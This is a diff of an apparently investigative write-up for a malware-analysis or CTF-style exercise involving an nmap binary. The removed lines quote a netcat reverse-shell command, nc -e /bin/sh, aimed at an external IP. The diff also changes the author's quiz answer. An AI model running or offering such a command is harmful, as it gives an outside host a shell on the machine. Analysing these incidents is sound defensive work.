@@ -36,15 +36,7 @@ After download the file that is given in case details, we can get `nmap` ELF fil
 nmap -sC -sP 172.16.20.0/24
 ```
 
-Also, we've a weird network activity which is nc connection request. The command is;
-
-```bash
-nc 101.32.223.119 1234 -e /bin/sh
-```
-
-After seeing that, my answer to the first question is;
-
-`Unknown or unexpected outgoing internet traffic`
+After seeing that, my answer to the first question is `Other`.
 
 The second is that malware quarantined/cleaned?
 
